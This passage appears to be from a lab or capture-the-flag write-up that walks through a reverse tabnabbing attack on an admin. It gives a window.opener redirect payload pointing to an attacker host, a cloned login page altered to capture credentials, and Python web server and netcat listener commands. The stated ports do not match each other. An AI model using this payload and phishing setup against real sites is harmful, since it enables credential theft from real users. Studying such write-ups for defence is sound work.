2. Exploitation Strategy
The exploitation involved creating a malicious HTML page which redirects the original tab to a fake login page controlled by the attacker.
Steps Performed
The original login page was copied from the application.
The copied login page was saved as index.html.
This page was modified to capture credentials submitted by the victim.
A malicious page (blog.html) was created containing a tabnabbing payload.
Example payload:
Copy code

<script>
window.opener.location='http://ATTACKER-IP:8000/index.html';
</script>
This script forces the original tab to redirect to the attacker-controlled login page.
3. Hosting the Malicious Pages
Two services were started on the attacker machine.
Python Web Server
Used to host the phishing login page.
Example:
Copy code

sudo python3 -m http.server 80
Netcat Listener
Used to capture submitted credentials.
Example:
Copy code

nc -lvnp 8000
4. Exploitation Process
The malicious link (blog.html) was submitted through the dashboard URL submission feature.
The application admin reviews submitted links.
When the admin clicked the link:
A new tab opened with the attacker-controlled page.
The malicious script redirected the original tab to the phishing login page.
The admin believed they were logged out and entered their credentials again.
The credentials were captured by the attacker.
